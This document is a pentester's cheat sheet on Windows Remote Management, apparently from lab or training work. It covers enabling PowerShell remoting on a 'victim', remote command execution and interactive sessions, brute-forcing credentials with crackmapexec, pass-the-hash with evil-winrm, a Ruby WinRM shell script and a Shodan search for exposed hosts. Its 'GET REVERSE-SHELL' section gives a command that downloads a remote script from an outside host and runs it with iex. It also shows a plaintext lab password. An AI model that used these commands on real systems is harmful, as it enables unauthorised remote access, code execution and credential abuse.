WINDOWS REMOTE MANAGEMENT (WinRM) :

WinRM is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so 
you can think of it as an HTTP based API for WMI.

WinRM is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers 
and servers, as well as Operating Systems and applications. WinRM allows the user to :
        → Remotely communicate and interface with hosts
        → Execute commands remotely on systems that are not local to you but are network accessible.
        → Monitor, manage and configure servers, operating systems and client machines from a remote location.

As a pentester, this means that if we can find CREDENTIALS (typically USERNAME and PASSWORD) for a user who
has remote management privileges, we can potentially get a PowerShell shell on the host.

If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote 
PowerShell session on the machine (as if you were using SSH!)

- The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:
        - 5985/tcp (HTTP)
        - 5986/tcp (HTTPS)
If one of these ports is open, WinRM is configured and you can try entering a remote session.



INITIATING WinRM SESSION :

We can configure PowerShell to work with WinRM. According to Microsoft documentation, Enable-PSRemoting is a cmdlet that configures the computer to 
receive PowerShell remote commands. 
If we have access to an elevated PowerShell prompt on the victim, we cam enable it and add any "attackers" as trusted hosts. 

- We can run the following two commands:
        > Enable-PSRemoting -Force  
        > Set-Item wsman:\localhost\client\trustedhosts *

This adds a wildcard to the trustedhosts setting. Be wary of what that entails. 
NOTE: I had to change the network type on my attack machine from "Public" to "Work" network.

- You can also activate WinRM remotely **_using _wmic:
        > wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"



TEST IF CONFIGURED :

Once the attack machine is configured, use the Test-WSMan function to test whether the target is configured for WinRM. You should see some information 
returned about the protocol version and wsmid:
        > Test-WSMan -computername DCORP-STD110
        > Test-WSMan



EXECUTE A COMMAND :

Now we can use PowerShell's Invoke-Command to remotely execute a command on the target over WinRM. To remotely run ipconfig and see the output:
       ?> Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
        >  Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {ipconfig /all}


You can also execute a command of your current PS console via Invoke-Command. Suppose that you have locally a function called enumeration and you want 
to execute it in a remote computer, you can do:
        > Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]



EXECUTE A SCRIPT :

        > Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]



GET REVERSE-SHELL :
        
        > Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}



GET A PS SESSION :

Or, if you want to drop right into an interactive PowerShell session, use the Enter-PSSession function:
        __
       |
                #If you need to use different creds
                > $password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
                ## Note the ".\" in the suername to indicate it's a local user (host domain)
                > $creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

                # Enter
                > Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
                ## Bypass proxy
                > Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
                # Save session in var 
                > $sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
                > Enter-PSSession $sess
                ## Background current PS session
                > Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
                                                                                                                                                      |
                                                                                                                                                     __
        The session will run in a new process (wsmprovhost) inside the "victim"



FORCING WinRM OPEN :

If you really want to use PS Remoting and WinRM but the target isn't configured for it, you could "force" it on through a single command. I wouldn't 
recommend this but if you really wanted to use WinRM or PSRemoting than by all means do it this way. 

For example, using PSExec:
        > PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
        
        Now we can enter a remote PS session on the victim.



SAVING AND RESTORING SESSIONS :

This won't work if the the language is constrained in the remote computer.

        __
       |
                #If you need to use different creds
                > $password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
                ## Note the ".\" in the suername to indicate it's a local user (host domain)
                > $creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

                #You can save a session inside a variable
                > $sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
                #And restore it at any moment doing
                > Enter-PSSession -Session $sess1               
                                                                                                        
                                                                                                                                                |
                                                                                                                                               __
        Inside this sessions you can load PS scripts using Invoke-Command
                > Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1




ERRORS :

If you find the following error:

                enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The 
                WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if 
                the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine
                must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that 
                computers in the TrustedHosts list might not be authenticated. You can get more information about that by running 
                the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.


Then try on the client URL : "https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server"
        
        > winrm quickconfig
        > winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'













-----------------------------****************-----------------------------------********************--------------------------------













WinRM CONNECTION ON LINUX :



BRUTE FORCE :

Be careful, brute-forcing winrm could block users.

        #Brute force
        > crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

        #Just check a pair of credentials
        # Username + Password + CMD command execution
        > crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
        
        # Username + Hash + PS command execution
        > crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'

        #Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm



USING WinRM :

        > gem install evil-winrm

Read documentation on its github: "https://github.com/Hackplayers/evil-winrm"

        >>> evil-winrm -u Administrator -p Password -i <IP>/<Domain>

To use evil-winrm to connect to an IPv6 address create an entry inside /etc/hosts setting a domain name to the IPv6 address and connect to that domain.


PASS THE HASH WITH evil-winrm

        >>> evil-winrm -u <username> -H <Hash> -i <IP>



USING A PS-DOCKER MACHINE :

        > docker run -it quickbreach/powershell-ntlm
        > $creds = Get-Credential
        > Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds



USING A RUBY SCRIPT :

Code extracted from here: https://alamot.github.io/winrm_shell/


------------------>>>

require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new( 
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end    
    puts("Exiting with code #{output.exitcode}")
end

<<<-----------------------




SHODAN :

        > port:5985 Microsoft-HTTPAPI
        


































